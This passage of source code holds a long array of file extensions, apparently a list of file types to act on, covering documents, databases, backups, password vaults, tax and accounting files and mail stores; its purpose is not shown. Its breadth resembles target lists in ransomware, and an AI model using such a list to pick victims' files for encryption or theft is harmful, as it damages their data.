					"dif", "dig", "dii", "dim", "dime", "dip", "dir", "directory", "disc", "disco",
					"disk", "dist", "dit", "dita", "ditamap", "ditaval", "divx", "diz", "djbz", "djv",
					"djvu", "dk@p", "dkt", "dl", "dl_", "dlc", "dlg", "dlis", "dlt", "dltemp",
					"dm2", "dmbk", "dmc", "dmg", "dmgpart", "dmm", "dmmx", "dmo", "dmp", "dmpr",
					"dmr", "dms", "dmsp", "dmtemplate", "dmv", "dna", "dng", "dnl", "dob", "doc",
					"doc#", "docb", "doce", "docenx", "dochtml", "dockzip", "docl", "docm", "docmhtml", "docs",
					"docset", "docstates", "doct", "documentrevisions-v100", "docx", "docxl", "docxml", "dok", "dot", "dothtml",
					"dotm", "dotmenx", "dotx", "dotxenx", "dox", "doxy", "doz", "dp", "dp1", "dpb",
					"DPC", "dpd", "dpi", "dpk", "dpl", "dpn", "dpr", "dps", "dpt", "dpx",
					"dqy", "dr", "drd", "dream", "drf", "drl", "drm", "drmx", "drmz", "drscan",
					"drw", "dsb", "dsc", "dsd", "dsdic", "dsf", "dsg", "dsk", "dsl", "dsn",
					"dsp", "dss", "dsx", "dsy", "dsz", "dt", "dta", "dtd", "dtm", "dtml",
					"dtp", "dtr", "dtsx", "dtx", "dump", "dupeguru", "dvb", "dvc", "dvd", "dvdproj",
					"dvds", "dvi", "dvo", "dvs", "dvx", "dvz", "dwd", "dwdoc", "dwf", "dwfx",
					"dwg", "dwi", "dwlibrary", "dwp", "dws", "dwt", "dxb", "dxd", "dxe", "dxf",
					"dxg", "dxl", "dxn", "dxp", "dxr", "dxstudio", "dz", "dzp", "e01", "e2p",
					"e3s", "e4a", "eap", "eas", "easmx", "ebk", "ebm", "ebs", "ebuild", "ec0",
					"ec3", "ec4", "ecc", "ecl", "ecm", "eco", "ecr", "ecs", "ecsbx", "ect",
					"ecx", "eda", "edat", "edat2", "edb", "edd", "ede", "edf", "edfx", "edg",
					"edi", "edk", "edl", "edml", "edn", "edoc", "edq", "edrwx", "eds", "edt",
					"edv", "edz", "eep", "ef", "efa", "efax", "eff", "efl", "efm", "efp",
					"efr", "eftx", "efu", "efw", "efx", "egg", "eglib", "egp", "egr", "egt",
					"ehp", "eif", "eip", "ekb", "ekm", "el6", "eld", "elf", "elfo", "eln",
					"els", "em", "emb", "embl", "emc", "emd", "emf", "eml", "emlxpart", "emm",
					"emrg", "emrg2", "enc", "enciphered", "encrypted", "enex", "enfpack", "enl", "enlx", "enq",
					"ent", "env", "enw", "enx", "enyd", "eob", "eot", "ep", "epdf", "EPF",
					"epi", "epim", "epk", "epp", "eprtx", "eps", "epsf", "ept", "epub", "epw",
					"eql", "er1", "erbsql", "erd", "ere", "erf", "erg", "erp", "err", "ersx",
					"es", "es2", "es3", "esb", "esc", "esd", "ese", "esf", "esm", "esp",
					"esq", "ess", "est", "esv", "esx", "et", "ete", "etng", "etnt", "ets",
					"ett", "etx", "euc", "eui", "ev", "EV1", "EV2", "EV3", "ev3p", "ev3s",
					"evo", "evx", "evy", "ewl", "ews", "ex", "ex01", "exb", "exc", "exd",
					"exf", "exif", "exl", "exm", "exp", "exprwdhtml", "exprwdxml", "exx", "ez", "ezc",
					"ezm", "ezs", "ezz", "f", "f04", "f06", "f3z", "f4v", "f90", "f96",
					"fa", "fac", "fadein", "fae", "familyfile", "faq", "far", "fas", "fasta", "fax",
					"fbc", "fbd", "fbf", "fbk", "fbp6", "fbq", "fbs", "fbu", "fbw", "fcd",
					"fcf", "fcpbundle", "fcpevent", "fcpproject", "fcpxdest", "fcpxml", "fcs", "fcstd", "fct", "fd",
					"fdb", "fdd", "fdf", "fdi", "fdm", "fdoc", "fdp", "fdr", "fds", "fdseq",
					"fdt", "fdw", "fdx", "FE", "fed", "feed-ms", "feedsdb-ms", "fes", "ff", "ffa",
					"ffd", "ffdata", "fff", "ffindex", "ffl", "ffo", "fft", "ffwp", "ffx", "fg3",
					"fh", "fhc", "fhd", "fhf", "fic", "fid", "fig", "fil", "fin", "fingnet",
					"fl", "fla", "flac", "flag", "flam3", "flame", "flat", "flf", "flg", "flib",
					"flipchart", "flk", "flka", "flkb", "fll", "flm", "flo", "flow", "flp", "fls",
					"flt", "fltr", "flv", "flvv", "flwa", "fly", "fm", "fm3", "fmat", "fmc",
					"fmd", "fmf", "fml", "fmp", "fmp12", "fmp3", "fmpsl", "fmt", "fnbk", "fnf",
					"fnm", "fnrecipes", "fo", "fob", "fodg", "fodp", "fods", "fodt", "fol", "folio",
					"folx", "fop", "for", "forge", "fos", "fountain", "fox", "fp", "fp3", "fp4",
					"fp5", "fp8", "fpa", "fpage", "fpdoclib", "fpenc", "fphomeop", "fpk", "fplinkbar", "fpp",
					"fpr", "fpsl", "fpsx", "fpt", "fpx", "fqc", "fra", "frag", "frameset", "frd",
					"frdat", "frdoc", "freepp", "frelf", "frl", "frm", "fro", "fs", "fsa", "fsc",
					"fsd", "fsf", "fsh", "fsif", "fsp", "fss", "fstab", "ft10", "ft11", "ft7",
					"ft8", "ft9", "ftil", "ftl", "ftm", "ftmb", "ftr", "ftw", "ful", "fwbackup",
					"fwdict", "fwk", "fwtemplate", "FX", "fxd", "fxf", "fxg", "fxo", "fxp", "fxr",
					"fza", "fzb", "fzbz", "fzh", "fzip", "fzpz", "g1m", "g3m", "g41", "ga3",
					"gadgeprj", "gal", "gallery", "gam", "gan", "gar", "gb", "gb1", "gb2", "gbi",
					"gbk", "gbl", "gbo", "gbp", "gbr", "gbs", "gc", "gca", "gcd", "gcg",
					"gcproj", "gcsx", "gct", "gcw", "gcx", "gd3", "gdb", "gdbtable", "gdc", "gdf",
					"GDL", "gdoc", "gdrive", "gdt", "gdtb", "ged", "gedata", "gedcom", "gen", "genbank",
					"geo", "gev", "gevl", "gexf", "gfe", "gfi", "gform", "gfs", "gfx", "ggb",
					"ghe", "gho", "ghs", "gi", "gil", "gis", "giw", "gkh", "gla", "gld",
					"glink", "glk", "glo", "glos", "gls", "gly", "gmap", "gmbl", "gml", "gmp",
					"gms", "gmz", "gnd", "gno", "gnp", "gnutar", "gofin", "gp3", "gp4", "gpd",
					"gpf", "gpg", "gpi", "gpj", "gpn", "gpp", "gpr", "gpscan", "gpx", "gpz",
					"gra", "grade", "graphml", "graphmlz", "gray", "grd", "grdb", "grey", "grf", "grib",
					"grib2", "grind", "grindx", "grk", "grle", "groups", "grp", "grr", "grs", "grt",
					"grv", "GRXML", "gry", "gs", "gsa", "gs-bck", "gsf", "gsheet", "gslides", "gsm",
					"GTA", "gtable", "gtar", "gthr", "gtl", "gtm", "gto", "gtp", "gts", "gui",
					"guides", "gul", "gvi", "gwi", "gwk", "gwp", "gxk", "gxl", "gxt", "gz",
					"gz2", "gza", "gzi", "gzig", "gzip", "h", "h10", "h11", "h12", "h13",
					"h14", "h15", "h16", "h17", "h1q", "h1s", "h1w", "h2o", "h2w", "h3m",
					"h4", "h4r", "h5", "h6x", "h77t", "haas", "hal", "haml", "hbk", "hbl",
					"hbx", "hc", "hcc", "hce", "hci", "hcl", "HCP", "hcr", "hcu", "hcw",
					"hcx", "hcxs", "hda", "hdb", "hdd", "hdf", "hdi", "hdl", "hdpmx", "hds",
					"hdt", "hdumx", "hdx", "hed", "help", "helpindex", "HEQ", "hex", "hfd", "hfs",
					"hft", "hfv", "hhs", "hif", "hin", "his", "hjt", "hkdb", "HKF", "hkx",
					"hl", "hlf", "hlp", "hlx", "hlx2", "hlz", "hm2", "hm3", "hml", "hmskin",
					"hmt", "hmxp", "hmxz", "hnd", "hoi4", "hol", "hot", "hp2", "hpd", "hpj",
					"hplg", "hpo", "hpp", "hps", "hpt", "hpw", "hqx", "hrx", "hs", "hs2",
					"hsdt", "hsk", "hsm", "hst", "hsx", "hta", "htb", "htg", "htm", "htm~",
					"html", "htmls", "htmlz", "htms", "htpasswd", "htz5", "huh", "hvc", "HVE", "hvpl",
					"hw3", "hwp", "hwpml", "hwt", "hxe", "hxi", "HXL", "HXN", "hxq", "hxr",
					"hxs", "HXX", "hyp", "hype", "hyv", "i00", "i01", "i02", "i5z", "iab",
					"iaf", "ial", "ias", "ib", "iba", "ibadr", "ibank", "ibb", "ibcd", "ibd",
					"ibdat", "ibg", "ibk", "ibp", "ibq", "ibz", "icalevent", "icaltodo", "icbu", "icc",
					"icf", "icg", "ichat", "icml", "icmt", "ico", "icr", "ics", "icst", "icxs",
					"id2", "id3tag", "idap", "idb", "idc", "idd", "idl", "idml", "idp", "idx",
					"ie5", "ie6", "ie7", "ie8", "ie9", "ies", "ifaith", "iff", "ifiction", "ifm",
					"ifp", "ifs", "igc", "igg", "igma", "ign", "igq", "igr", "ihf", "ihp",
					"ihx", "ii", "iif", "iiq", "iks", "ila", "ildoc", "ilg", "ilogicvb", "ima",
					"image", "imd", "img", "imp", "imr", "imt", "imz", "in", "INBOX", "INC",
					"incp", "incpas", "ind", "indb", "indd", "INDEX", "indl", "indp", "indt", "inf",
					"info", "ink", "inld", "inlk", "inp", "inprogress", "inrs", "ins", "inss", "installhelper",
					"insx", "internetconnect", "inx", "ioca", "iof", "ip", "ipa", "ipalias", "ipd", "ipf",
					"iphoto", "iplb", "ipmeta", "ipr", "iproject", "iq4", "iqmol", "irock", "irp", "irr",
					"irx", "is1", "is2", "isf", "ish1", "ish2", "ish3", "iso", "ispc", "ispx",
					"ist", "isu", "isz", "itdb", "ite", "itl", "itlp", "itm", "itmsp", "itmz",
					"itn", "itp", "its", "itw", "itx", "iup", "iv2i", "ivc", "ivd", "ivs",
					"ivt", "iw", "iw44", "iwa", "iwd", "iwi", "iwm", "iwprj", "iwtpl", "iwxdata",
					"ix", "ix2", "ixa", "ixb", "ixv", "j01", "jac", "jar", "jasper", "jav",
					"java", "jb2", "jbc", "jbi", "jbig", "jbig2", "jbk", "jbr", "jc", "jclic",
					"JCP", "jdat", "jdb", "jdc", "jdd", "jef", "jet", "jfif", "JFM", "jgcscs",
					"jge", "jgz", "jhd", "jiaf", "jias", "jif", "jiff", "jmp", "jnb", "jnt",
					"joboptions", "joe", "joined", "jp1", "jpa", "jpc", "jpe", "jpeg", "jpf", "jpg",
					"jpgx", "jph", "jpm", "jps", "jpw", "jrf", "jrl", "jrprint", "JRS", "jrxml",
					"js", "JS1", "jsd", "jsda", "json", "jsp", "jspa", "jspx", "jtbackup", "jtd",
					"jtdc", "jtt", "JTX", "jude", "just", "jw", "jwl", "jww", "k25", "k3b",
					"kal", "kap", "kb2", "kbd", "kbf", "kbits", "kbs", "kc2", "kdb", "kdbx",
					"kdc", "kde", "kdf", "kdz", "keb", "kelgfile", "kes", "kexi", "kexic", "kexis",
					"key", "keychain", "keynote", "keytab", "key-tef", "kf", "kfm", "kfp", "kgtemp", "kid",
					"kismac", "klq", "klw", "kma", "kms", "kmy", "kmz", "kno", "knt", "kos",
					"kpdx", "kpf", "kpp", "kpr", "kpx", "kpz", "krc", "ksd", "ksm", "ksp",
					"kss", "ksw", "kth", "kuip", "kvtml", "kwd", "kwm", "kwp", "l", "l01",
					"l3dw", "l6t", "la", "label", "laccdb", "las", "lastlogin", "lat", "latex", "lav",
					"lax", "lay", "lay6", "layout", "lbf", "lbi", "lbl", "lbx", "lcb", "lcd",
					"lcf", "LCK", "lcm", "lcn", "ld2", "ldabak", "ldb", "ldif", "lef", "lev",
					"lex", "lfe", "lfp", "lg1", "lg2", "lgc", "lgf", "lgh", "lgi", "lgl",
					"lgp", "lhd", "lhr", "lib", "lib4d", "lif", "life", "lin", "list", "lit",
					"litemod", "livereg", "liveupdate", "lix", "LKG", "ll3", "llb", "llv", "llx", "LM",
					"lmd", "lmf", "lms", "lmx", "lng", "lngttarch2", "lnt", "lnx", "LO_", "loc",
					"localstorage", "LOG1", "logonxp", "lok", "lot", "lp", "lp2", "lp7", "lpa", "lpc",
					"lpd", "lpdb", "lpdf", "lpk", "lpkg", "lpmd", "lpp", "lpx", "lqm", "lrcat",
					"lrdata", "lrf", "lrlib", "lrlibrary", "lrm", "lrtoolkit", "ls3", "ls5", "lsa", "lsd",
					"lsf", "lsl", "lsp", "lsr", "lst", "lsu", "ltcx", "ltm", "ltr", "LTS",
					"ltx", "lua", "lud", "lut", "lutx", "lvd", "lvivt", "lvl", "lvm", "lvw",
					"lw4", "lwd", "lwo", "lwp", "lwx", "lx01", "lxf", "lxk", "ly", "lyt",
					"lyx", "m", "m13", "m14", "m2", "m2ts", "m3u", "m3u8", "m4a", "m4p",
					"m4u", "m4v", "m7p", "maca", "maf", "mag", "mai", "maker", "maml", "man",
					"manu", "map", "mapimail", "MAPSTYLE", "maq", "mar", "marc", "markdn", "mars", "marshal",
					"mas", "mass", "mat", "mav", "max", "maxfr", "maxm", "mba", "mbbk", "mbd",
					"mbf", "mbg", "mbi", "mbox", "mbp", "mbx", "mc1", "mc9", "mcat", "mcd",
					"mcdx", "mcf", "mcgame", "mcmac", "mcmeta", "mcp", "mcrp", "mcw", "mcx", "md",
					"md0", "md1", "md2", "md3", "md5", "md8", "mdbackup", "mdbhtml", "mdc", "mdccache",
					"mdd", "mddata", "mdg", "mdi", "mdinfo", "mdj", "mdk", "mdl", "mdm", "mdn",
					"mds", "mdsx", "MDT", "mdx", "MDZ", "mecontact", "med", "mef", "meg", "mega",
					"meh", "mell", "mellel", "mem", "menc", "menu", "meo", "merlin2", "met", "METADATA",
					"metadata_never_index", "mex", "mf", "mf4", "mfa", "mfe", "mfl", "mfo", "mfp", "mft",
					"mfu", "mfv", "mfw", "mga", "mgmt", "mgourmet", "mgourmet3", "mgourmet4", "mhp", "mht",
					"mhtenx", "mhtmlenx", "mi", "mic", "mid", "mif", "mim", "mime", "mindnode", "miniso",
					"mip", "mission", "mix", "mjd", "mjdoc", "mjk", "mkd", "mke", "mkv", "mla",
					"mlb", "mlc", "mlj", "mlm", "mls", "mlsxml", "mlx", "mm", "mm6", "mm7",
					"mm8", "mmap", "mmc", "mmd", "mme", "mmf", "mmjs", "mml", "mmm", "mmo",
					"mmp", "mmsw", "mmw", "mnc", "mng", "MNI", "mnk", "mno", "mny", "mo",
					"mobi", "mod", "MODEL", "MOF", "moho", "mol", "money", "moneywell", "mos", "mosaic",
					"mov", "movie", "mox", "moz", "mp1", "mp2", "mp4v", "mpa", "mpd", "mpe",
					"mpeg", "mpf", "mpg", "mph", "mpj", "mpkt", "mpp", "mppz", "mpq", "mpqge",
					"mpr", "mps", "mpt", "mpv", "mpv2", "mpx", "mpz", "mrd", "mrg", "mrimg",
					"mru", "mrw", "mrwref", "ms", "ms10", "msb", "msc", "msct", "msd", "mse",
					"msf", "msg", "mshc", "msie", "msim", "msl", "mso", "msor", "msp", "msq",
					"mss", "ms-tnef", "msw", "mswd", "mtdd", "mte", "mtf", "mtff", "mth", "MTL",
					"mtm", "mtml", "mto", "mtp", "mts", "mtw", "mtx", "mtxt", "mud", "mug",
					"mui", "mum", "mup", "mvd", "mvdx", "mvex", "mvm", "mw", "mwb", "mwd",
					"mwf", "mwii", "mwpd", "mwpp", "mws", "mwx", "mx", "mxad", "mxc2", "mxd",
					"mxg", "mxi", "mxl", "mxp", "myd", "mydocs", "myi", "myo", "mz", "n3",
					"nam", "names", "nap", "narrative", "nas", "nav", "navmap", "nb", "nb7", "nba",
					"nbak", "nbd", "nbe", "nbf", "nbi", "nbk", "nbp", "nbs", "nbu", "nc",
					"ncd", "ncf", "nco", "ncorx", "nct", "nd", "nda", "ndb", "ndd", "ndif",
					"ndk", "ndl", "ndr", "nds", "ndx", "ne1", "ne3", "nef", "nessus", "net",
					"neta", "netspd", "netspm", "NEW", "nfb", "nfc", "nfi", "nfl", "nfo", "nfs",
					"nfs11save", "ng", "NGR", "nitf", "njx", "nk2", "nl", "nlogo", "nlogo3d", "NLP",
					"NLT", "nma", "nmbtemplate", "nmea", "nmind", "nmm", "nmp", "nmu", "nn", "nni",
					"NNM", "nnp", "nnt", "nokogiri", "nop", "not", "note", "notebook", "now", "noy",
					"np", "npd", "npdf", "npf", "npl", "npp", "npr", "nps", "npt", "npy",
					"nrb", "nrbak", "nrc", "nrd", "nrf", "nrg", "nri", "nrl", "nrm", "nrmlib",
					"nrs", "nrt", "nru", "nrw", "nrx", "ns2", "ns3", "ns4", "nsd", "nsg",
					"nsh", "nsq", "nsr", "nst", "nt", "ntf", "ntl", "ntp", "nts", "ntx",
					"NU2", "number", "numbers", "nupkg", "NUS", "NUSPEC", "nv", "nv2", "nvd", "nvdl",
					"nvl", "nvm", "nvram", "nwb", "nwbak", "nwcab", "nwcp", "nwdb", "nwelicense", "nwo",
					"nwp", "nws", "nx^d", "nx__", "nx1", "nx2", "nxl", "nyf", "oa2", "oa3",
					"oab", "oad", "oas", "obb", "OBD", "OBE", "obj", "obk", "obr", "obt",
					"obx", "obz", "occ", "ocdc", "ocimf", "ocs", "od", "oda", "odb", "odc",
					"odccubefile", "odf", "odg", "odh", "odi", "odif", "odm", "odo", "odp", "ods",
					"odt", "odt#", "odttf", "odx", "odz", "oeaccount", "oeb", "oem", "ofc", "officeui",
					"ofm", "ofn", "oft", "ofx", "oga", "ogc", "ogg", "oggu", "ogm", "ogmu",
					"ogs", "oil", "ojz", "okm", "old", "ole", "ole2", "olf", "olk", "olk14event",
					"olk14group", "olk14note", "olk14task", "oll", "olm", "olt", "olv", "oly", "omcs", "omg",
					"omlog", "omp", "onb", "ond", "one", "onepkg", "ont", "ontx", "oo3", "oos",
					"oot", "op", "op2", "op4", "opal", "opax", "opd", "opf", "opj", "opju",
					"oplx", "opn", "opt", "opx", "opxs", "oqy", "or2", "or3", "or4", "or5",
					"or6", "ora", "orf", "org", "ori", "orig", "ORP", "ort", "orx", "osd",
					"osdx", "ost", "osz", "ot", "otc", "otf", "otg", "oth", "oti", "otl",
					"otln", "otn", "otp", "ots", "ott", "otw", "otx", "out", "ova", "ovd",
					"ovf", "ovolog", "ovx", "owc", "owl", "owx", "oxps", "oxt", "oyx", "p01",
					"p10", "p12", "p2g", "p2i", "p2s", "p3", "p3x", "p65", "p7b", "p7c",
					"p7x", "p7z", "p96", "p97", "pab", "pack", "pad", "paf", "pages", "pages-tef",
					"pak", "pan", "paq", "partimg", "pas", "pat", "paux", "paw", "pbd", "pbf",
					"pbix", "pbj", "PBK", "pbp", "pbr", "pbs", "pbx5script", "pbxscript", "pc", "pcap",
					"pcapng", "pcb", "pcc", "pcd", "pcf", "pch", "pcj", "pck", "pcr", "PCS",
					"pct", "pcv", "pcw", "pd", "pd4", "pd5", "pdas", "pdb", "pdc", "pdcr",
					"pdd", "pdf", "pdf_", "pdf_profile", "pdf_tsid", "pdfa", "pdfe", "pdfenx", "pdfig", "pdfl",
					"pdfua", "pdfvt", "pdfx", "pdfxml", "pdfz", "pdg", "pdi", "pdm", "pdo", "pdp",
					"pds", "pdw", "pdx", "pdz", "peb", "pef", "pem", "pep", "PERF", "pes",
					"pex", "pez", "pf", "pfc", "pfd", "pfl", "pfm", "pfsx", "pft", "pfx",
					"pg", "pgd", "pgs", "phb", "phd", "phm", "php", "phr", "phs", "pih",
					"pixexp", "pj2", "pj4", "pj5", "pjm", "pjt", "pk", "pka", "pkb", "pkey",
					"pkg", "pkh", "pkpass", "pks", "pkt", "pl", "plan", "planner", "plb", "plc",
					"pld", "pli", "pln", "pls", "plt", "plus_muhd", "plw", "pm", "PM2", "pm3",
					"pm4", "pm5", "pm6", "pm7", "pmatrix", "pmd", "pmf", "pml", "pmm", "pmo",
					"pmr", "pmt", "pmv", "pmx", "pnproj", "pns", "pnu", "pnz", "po", "POC",
					"pod", "poi", "pool", "popshape", "por", "pot", "pothtml", "potm", "potx", "pp",
					"pp2", "pp3", "ppam", "ppd", "ppdf", "ppf", "ppj", "ppp", "ppr", "pps",
					"ppsenx", "ppsm", "ppsx", "ppt", "ppte", "ppthtml", "pptl", "pptm", "pptmhtml", "pptt",
					"pptx", "ppws", "ppx", "prc", "prd", "prdx", "pref", "prel", "prf", "printcd2",
					"prj", "prn", "pro", "pro4", "pro4dvd", "pro4pl", "pro4plx", "pro4x", "pro5", "pro5dvd",
					"pro5pl", "pro5plx", "pro5x", "pro6plx", "proofingtool", "props", "proqc", "prproj", "prr", "prs",
					"prt", "prtc", "prv", "prx", "ps", "PS1XML", "ps2", "ps3", "psa", "psafe3",
					"psb", "psd", "PSD1", "pse8db", "psf", "psg", "psi2", "psip", "psk", "psm",
					"PSM1", "psmd", "pspd", "pspimage", "pss", "pst", "psv", "psw", "psw6", "pswx",
					"psz", "pt3", "pt6", "ptb", "ptc", "ptf", "pth", "ptk", "ptn", "ptn2",
					"pts", "ptx", "PTXML", "ptz", "pub", "pubf", "pubhtml", "pubmhtml", "pubx", "puz",
					"pvd", "pve", "pvf", "pvhd", "pvm", "pvw", "pw", "pwd", "pwe", "pwf",
					"pwi", "pwm", "pwp", "pwre", "pxd", "pxf", "pxi", "pxj", "pxl", "pxp",
					"py", "pys", "pzc", "pzf", "pzt", "q07", "q08", "q09", "q3d", "qb",
					"qb2005", "qb2006", "qb2007", "qb2009", "qb2010", "qb2011", "qb2012", "qb2013", "qb2014", "qb2015",
					"qb2016", "qb2017", "qba", "qbatlg", "qbb", "qbj", "qbk", "qbl", "qbm", "qbmb",
					"qbmd", "qbr", "qbw", "qbx", "qbxml", "qby", "qch", "qcow", "qcow2", "qct",
					"qdat", "qdb", "qdf", "qdf-backup", "qdfm", "qdfx", "qdp", "qdt", "qed", "qel",
					"qf", "qfilter", "qfl", "qfx", "qfxx", "qhp", "qht", "qhtm", "qic", "qif",
					"qlgenerator", "qm", "qmbl", "qmtf", "qpb", "qpf", "qph", "qpx", "qrc", "qrmx",
					"qrp", "qrt", "qry", "qs", "qsd", "qsf", "qt", "qtq", "qtr", "qtw",
					"QUE", "quiz", "quox", "qv~", "qvd", "qvf", "qvp", "qvw", "qwd", "qwt",
					"qxb", "qxd", "qxf", "qxl", "qxp", "qxt", "r00", "r01", "r02", "r03",
					"r0f", "r0z", "r3d", "ra", "ra2", "raf", "ral", "ram", "ramd", "rap",
					"rar", "RAT", "ratdvd", "raw", "ray", "razy", "rb", "rbc", "rbf", "rbk",
					"rbs", "rbt", "rcb", "rcc", "rcd", "rcg", "rcl", "rctd", "rcx", "rd",
					"rd1", "rda", "rdata", "rdb", "rdf", "rdfs", "rdg", "rdi", "RDLC", "rdlx",
					"rdo", "rdoc", "rdoc_options", "rdx", "rdz", "re4", "reb", "rec", "redif", "ref",
					"reference", "rel", "rels", "rep", "res", "resbuild", "RESJSON", "rest", "result", "RESW",
					"ret", "rev", "rez", "rf", "rf1", "rfa", "rfo", "rft", "rge", "rgmb",
					"rgmc", "rgn", "rgo", "rgss3a", "rha", "rhif", "rhistory", "rim", "rit", "rl",
					"rlf", "rll", "rm", "rm5", "rmbak", "rmd", "rmf", "rmh", "rmuf", "rmx",
					"rna", "rng", "rnq", "rnt", "rnw", "ro3", "roadtrip", "roca", "rod", "rodx",
					"rodz", "rofl", "rog", "roi", "ROM", "ros", "rou", "rov", "row", "rox",
					"roxio", "roz", "rp", "rpa", "rpd", "rpf", "RPO", "rpp", "rpprj", "rpres",
					"rpt", "rptr", "rpyb", "rrd", "rrpa", "rrr", "rrt", "rrx", "rs", "rsc",
					"rsd", "rsdf", "rsdoc", "rsf", "rsm", "rso", "rsp", "rsrc", "rst", "rsv",
					"rsw", "rt", "rt_", "rta", "rtdf", "rte", "rtf", "rtf_", "rtfd", "rtk",
					"rtp", "rtpi", "rts", "rtsl", "rtstn", "rtsx", "rtttl", "rtwsh", "rtx", "ruel",
					"rum", "run", "rupaf", "rv", "rvf", "rvl", "rvt", "rw2", "rwd", "rwg",
					"rwl", "rwlibrary", "rws", "rwz", "rxdoc", "rzk", "rzx", "s3db", "s85", "s8bn",
					"sa5", "sa7", "sa8", "saas", "sad", "saf", "safe", "safetext", "sah", "sam",
					"sar", "sas7bdat", "sav", "save", "say", "sb", "sbc", "sbd", "sbf", "sbn",
					"sbo", "sbpf", "sbs", "sbsc", "sbst", "sbu", "sbw", "sbx", "sc2save", "sc4",
					"sc45", "sca", "scd", "scdoc", "sce", "scf", "scg", "scgc", "scgp", "scgs",
					"sch", "SCHEMA", "scm", "scmt", "scn", "sco", "scr", "scriv", "scrivx", "scs",
					"scspack", "scssc", "sct", "scw", "scx", "scz", "sd", "sd0", "sd1", "sda",
					"sdb", "sdc", "sdd", "sddraft", "sdi", "sdl", "sdlxliff", "sdmdocument", "sdn", "sdo",
					"sdoc", "sdp", "sdr", "sds", "sdsk", "sdt", "sdv", "sdw", "sdz", "se1",
					"SEARCH-MS", "secure", "seed", "sef", "sel", "sen", "seo", "seq", "sequ", "server",
					"ses", "set", "setup", "sev", "sfd", "sff", "sfs", "sfx", "sgf", "sgi",
					"sgl", "sgm", "sgml", "sgz", "sh", "sh6", "shar", "shb", "show", "SHP",
					"shr", "shs", "shtml", "shw", "shx", "shy", "sic", "sid", "sidd", "sidn",
					"sidx", "sie", "sig", "sik", "sim", "sis", "skb", "skv", "skx", "sky",
					"sla", "sldm", "sldtm", "sldx", "sle", "slf", "slk", "SLL", "slm", "slp",
					"slt", "slx", "slz", "sm", "smc", "smd", "sme", "smf", "smh", "smi",
					"smlx", "smn", "smp", "smpkg", "sms", "smwt", "smx", "smz", "sn1", "sn2",
					"sna", "snag", "snapshot", "snb", "snf", "sng", "snk", "snp", "sns", "snt",
					"snx", "so", "soi", "sp", "spb", "spd", "spdf", "speccy", "spf", "spg",
					"spj", "spk", "spl", "spm", "spml", "sppt", "spq", "spr", "sprt", "sprz",
					"sps", "spt", "spub", "spv", "sq", "sqb", "sqd", "sqf", "sqfs", "sql",
					"sqlite", "sqlite3", "sqlitedb", "sqllite", "sqr", "sqx", "sr2", "src", "SRD", "SRD-SHM",
					"SRD-WAL", "srf", "srfl", "srr", "srs", "srt", "srw", "ssa", "ssc", "ssd",
					"ssh", "ssi", "ssiw", "ssm", "ssp", "ssv", "ssx", "st", "st4", "st5",
					"st6", "st7", "st8", "sta", "stc", "std", "stdl", "STF", "stg", "sti",
					"stk", "stl", "stm", "STORE", "stp", "stproj", "stpz", "str", "struct", "stt",
					"stu", "stw", "stx", "stxt", "sty", "styk", "stykz", "sub", "sud", "suf",
					"sum", "surf", "sv$", "sv2i", "svd", "svdl", "svf", "svg", "svi", "svm",
					"svn", "svp", "svr", "svs", "swd", "swdoc", "sweb", "swf", "SWIDTAG", "switch",
					"swk", "swp", "sx", "sxc", "sxd", "sxe", "sxg", "sxi", "sxl", "sxm",
					"sxml", "sxw", "syn", "syncdb", "t", "t01", "t02", "t03", "t04", "t05",
					"t06", "t07", "t08", "t09", "t10", "t11", "t12", "t13", "t14", "t15",
					"t16", "t17", "t18", "t2", "t2k", "t2ks", "t2kt", "t2t", "t4g", "t64",
					"t80", "ta1", "ta2", "ta4", "ta5", "ta6", "ta7", "ta8", "ta9", "tab",
					"tabula-doc", "tabula-docstyle", "tac", "tag", "tah", "tao", "tap", "tar", "tardist", "TARGETS",
					"tax", "tax08", "tax09", "tax10", "tax11", "tax12", "tax13", "tax15", "tax16", "tax17",
					"tax2008", "tax2009", "tax2010", "tax2011", "tax2012", "tax2013", "tax2014", "tax2015", "tax2016", "tax2017",
					"tax2018", "tax2019", "tb", "tbb", "tbd", "tbh", "tbk", "tbkx", "tbl", "tbx",
					"tbz2", "tc", "tcc", "tcd", "tch", "tck", "tclogs", "tcnet", "tcx", "td0",
					"tda", "TDAT", "tdb", "tde", "tdg", "tdl", "tdm", "tdms", "tdoc", "tdr",
					"tdt", "te", "te1", "te3", "teacher", "ted", "tef", "template", "temx", "ter",
					"terrn", "terrn2", "tet", "tex", "texi", "texinfo", "text", "textclipping", "textile", "tfa",
					"tfd", "tfm", "tfr", "tfrd", "tg", "tga", "tgc", "tgd", "tgf", "tgz",
					"THA", "thm", "thml", "thmx", "thr", "tib", "tibkp", "tie", "tif", "tiff",
					"tig", "time", "timeline", "tis", "tjp", "tk3", "tkfl", "tl5", "tlb", "tld",
					"tlg", "tlp", "tlt", "tlx", "tlz", "tm", "tm3", "tmb", "tmd", "TME",
					"tml", "tmlanguage", "tmp", "tmr", "tmv", "tmw", "tmx", "tmz", "tmzip", "tns",
					"tnsp", "toast", "toc", "TON", "top", "topc", "topx", "tor", "torrent", "totalsdb",
					"totalslayout", "tp", "tpb", "tpd", "tpf", "tpl", "tpo", "tps", "tpsdb", "tpu",
					"tpx", "tqs", "tra", "trashinfo", "trc", "trd", "TRE", "trf", "trif", "trk",
					"trm", "trn", "trp", "trs", "trx", "ts", "tsc", "tsk", "tsl", "tsr",
					"tst", "tsv", "tt10", "tt11", "tt12", "tt13", "tt14", "tt15", "tt16", "tt17",
					"tt18", "tt2", "ttax", "ttbk", "ttd", "ttk", "ttmd", "TTS", "ttskey", "ttxt",
					"tu", "tur", "tvc", "tvd", "tvdownload", "twb", "twbx", "twdi", "twdx", "twh",
					"twm", "tww", "twz", "twzip", "tx", "txa", "txd", "txe", "txf", "txm",
					"txn", "txtrpt", "tyimport", "tyset", "tzx", "u10", "u11", "u12", "u3d", "uax",
					"ubj", "ubox", "ubz", "uccapilog", "ucd", "uci", "ud", "udb", "udc", "udeb",
					"udf", "udl", "uds", "UDT", "uea", "ufs", "uhtml", "uibak", "uif", "ukr",
					"ulf", "uli", "ulp", "ulys", "ulz", "umf", "ump", "umx", "UNINSTALL", "unity3d",
					"unr", "UNT", "unx", "uof", "uop", "uos", "uot", "update", "updf", "upk",
					"upoi", "upp", "upr", "urd-journal", "urf", "url", "urp", "usa", "useq", "usr",
					"ustar", "usx", "ut2", "ut3", "utc", "utd", "ute", "utf8", "uti", "utm",
					"uts", "utx", "uu", "uud", "uue", "uvf", "uvw", "uvx", "uwl", "uwrf",
